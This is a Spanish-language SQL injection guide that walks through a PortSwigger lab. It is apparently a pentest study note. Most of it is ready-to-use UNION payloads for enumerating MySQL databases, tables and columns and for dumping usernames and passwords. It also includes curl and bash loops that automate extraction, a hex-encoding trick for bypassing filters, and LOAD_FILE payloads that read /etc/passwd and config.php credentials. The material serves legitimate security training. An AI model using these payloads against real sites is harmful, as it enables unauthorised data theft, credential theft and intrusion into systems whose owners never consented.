
---
# Guía práctica: SQL Injection para enumeración de MySQL


---

## Laboratorio Portswigger

Para ilustrar con ejemplos realistas vamos a seguir el laboratorio gratuito de [Portswigger](https://portswigger.net/web-security/all-labs)

Todas las pruebas se realizaron en la URL:

```url
https://web-security-academy.net/filter?category=Gifts
```

---

## Confirmación de la vulnerabilidad

**Acción:**


Comprobamos que el parámetro `Gifts'` es vulnerabl, inyectamos `ORDER BY 2-- -` para saber número de columnas e inyectamos con  `' UNION SELECT 1, 2-- -`.

```sql
'
```

```sql
'ORDER BY 2-- -
```

```sql
' UNION SELECT 1,2-- -
```

**Explicación:**

Si la inyección tiene éxito, la página mostrará los valores `1` y `2`  en la tabla. Esto confirma que:

- La aplicación concatena directamente el valor en una consulta SQL.
    
- El número de columnas es 2.
    
- Podemos continuar con otras inyecciones más complejas.
    

---

## Obtener versión de MySQL

```sql
' UNION SELECT 1, @@version-- -
```

## Listar todas las bases de datos

```sql
' UNION SELECT 1, schema_name FROM information_schema.schemata-- -
```
Al ejecutar esta query, en el laboratorio de ejemplo de Portswigger vemos algo así:

**Query realizada**

![Captura](./Imágenes/web_1.png)

**Bases de datos existentes**

![Captura](./Imágenes/web_2.png)

### Limit

En ocaciones, necesitaremos limitar la cantidad de información a mostrar. Para ello usaremos el parámetro `limit 0,1` para iterar entre las diferentes respuestas. Piense que hay casos que la información a extraer es extensa, y no es capaz de procesar toda la información de golpe. Por lo que limitar la informaicón mostrada iterarndo con `limit 0,1`, `limit 1,1`... es una buena alternativa

**Nota:** para no tener que iterar por cada post que haya en la página podemos empezar la query SQLi de la URL a partir del `=` y no desde su valor `=Gifts`

**Query habitual**: `https://web-security-academy.net/filter?category=Gifts' UNION SELECT 1, schema_name FROM information_schema.schemata-- -`

**Query sin post**: `https://web-security-academy.net/filter?category=Gifts' UNION SELECT 1, schema_name FROM information_schema.schemata limit 0,1-- -`

![Captura](./Imágenes/web_5.png)

### group_concat

Más potente que limit, y siempre que las circunstancias lo permitan, podemos usar el parámetro `group_concat` para agrupar la información y que se nos muestre de seguido

```bash
' UNION SELECT 1,group_concat(schema_name) FROM information_schema.schemata-- -
```

![Captura](./Imágenes/web_6.png)

### curl

En caso de obtener muchos resultados, y tener que usar limit sea algo lento de iterar, podemos o bien crear un script en bash que automatice esto, o usar el siguiente oneliner con curl 

```bash
curl -s -X GET https://0ab0008404e1b04e80a80d2500ce005d.web-security-academy.net/filter\?category\=%27%20union%20select%20NULL,table_name%20from%20information_schema.tables%20limit%201,1--%20-
```

![Captura](./Imágenes/curl_1.png)

```bash
curl -s -X GET https://0ab0008404e1b04e80a80d2500ce005d.web-security-academy.net/filter\?category\=%27%20union%20select%20NULL,table_name%20from%20information_schema.tables%20limit%201,1--%20- | grep "<td>" | html2text
```

Resultado:

```bash
CHECK_CONSTRAINTS
```

```bash
for i in $(seq 1 100); do echo "[+] Para el nº $i: $(curl -s -X GET https://0ab0008404e1b04e80a80d2500ce005d.web-security-academy.net/filter\?category\=%27%20union%20select%20NULL,table_name%20from%20information_schema.tables%20limit%20$i,1--%20- | grep "<td>" | html2text)"; done
```

En caso de no obtener la respuesta, entrecomillar URL

```bash
for i in $(seq 1 100); do echo "[+] Para el nº $i: $(curl -s -X GET "https://0ab0008404e1b04e80a80d2500ce005d.web-security-academy.net/filter\?category\=%27%20union%20select%20NULL,table_name%20from%20information_schema.tables%20limit%20$i,1--%20-" | grep "<td>" | html2text)"; done
```

**Recursos:** para urlencodear podemos usareste script --> [urlencode.py](../../../Lenguajes/Python/Utilidades%20Ofensivas/URL%20Enconde/Scripts/urlencode.py)

Resultado:

```bash
[+] Para el nº 1: CHECK_CONSTRAINTS
[+] Para el nº 2: COLLATIONS
[+] Para el nº 3: COLLATION_CHARACTER_SET_APPLICABILITY
[+] Para el nº 4: COLUMNS
[+] Para el nº 5: COLUMNS_EXTENSIONS
[+] Para el nº 6: COLUMN_STATISTICS
[+] Para el nº 7: EVENTS
[+] Para el nº 8: FILES
[+] Para el nº 9: INNODB_DATAFILES
[+] Para el nº 10: INNODB_FOREIGN
```

## Listar tablas de una base de datos

```sql
' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='nombre_base_datos'-- -
```

**Query realizada**

![Captura](./Imágenes/web_3.png)

**Tablas existentes en la base de datos 'academy_labs'**

![Captura](./Imágenes/web_4.png)

### Cadena hexadecimal

En ocasiones, por seguridad de la página, puede ser que no podamos introducir ciertas cadenas como `'academy_labs`. Para estos casos podemos introducir la cadena en hexadecimal de la siguiente forma

```bash
 echo -n "academy_labs" | xxd -p
```

Resultado:

```bash
61636164656d795f6c616273
```

La query quedaría así (añadimos `0x` para indicar el valor hexadecimal)

```bash
' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=0x61636164656d795f6c616273-- -
```


## Listar columnas de una tabla

```sql
' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='nombre_tabla'-- -
```

## Extraer usuarios de una tabla `users`

```sql
' UNION SELECT username, password FROM users-- -
```

---

## Resumen de payloads usados

```sql
1. ' UNION SELECT 1,2-- -
2. ' UNION SELECT 1, @@version-- -
3. ' UNION SELECT 1, schema_name FROM information_schema.schemata-- -
4. ' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='nombre_base_datos'-- -
5. ' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='nombre_tabla'-- -
6. ' UNION SELECT username, password FROM users-- -
```


---

## Otras queries útiles para SQLi (bonus)

## 1. Confirmación de la vulnerabilidad

**Acción:**

Comprobamos que el parámetro `port_code` es vulnerable inyectando un UNION SELECT.

```sql
' UNION SELECT 1,2-- -
```

## 2. Comprobar privilegios del usuario `root` en MySQL

### 2.1. Comprobar si tiene el privilegio `SUPER`

```sql
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

**Explicación:**

- `super_priv` = 'Y' indica que el usuario puede realizar acciones avanzadas en MySQL.
    
- Esto puede incluir cargar archivos o modificar configuraciones.
    

---

### 2.2. Enumerar todos los privilegios de `root@localhost`

```sql
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

**Explicación:**

Esta consulta muestra todos los privilegios otorgados explícitamente a `root@localhost`, por ejemplo:

```
SELECT, INSERT, UPDATE, FILE, CREATE
```

Si el usuario tiene `FILE`, puedes leer archivos con `LOAD_FILE()`.

---

## 3. Leer archivos del sistema con `LOAD_FILE()`

### 3.1. Leer `/etc/passwd`

```sql
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

**Explicación:**

Nos permite confirmar acceso al sistema de archivos. Muestra usuarios del sistema Linux.

---

### 3.2. Leer el archivo fuente `search.php`

```sql
' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

**Explicación:**

Este archivo es la propia aplicación vulnerable. Puede revelar:

- Cómo se construye la query SQL.
    
- Si hay includes/requires a otros archivos.
    

---

### 3.3. Leer `config.php` para obtener credenciales

```sql
' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

**Explicación:**

Este archivo suele contener las **credenciales de conexión a MySQL**, como:

```php
$db_user = "root";
$db_pass = "toor123";
```

Esto te permite conectarte directamente a la base de datos desde consola o herramientas como `sqlmap`.

## Resumen de payloads usados

```sql
1. ' UNION SELECT 1,2,3,4-- -
2. ' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
3. ' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
4. ' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
5. ' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
6. ' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```


---

## Conclusión

Este tipo de explotación SQLi permite:

- Confirmar la vulnerabilidad.
    
- Enumerar privilegios y configuraciones internas.
    
- Robar archivos del sistema.
    
- Escalar a control completo de la base de datos.
    

Una vez que obtienes credenciales, puedes avanzar hacia una **conexión directa**, pivotar o buscar vulnerabilidades adicionales.

---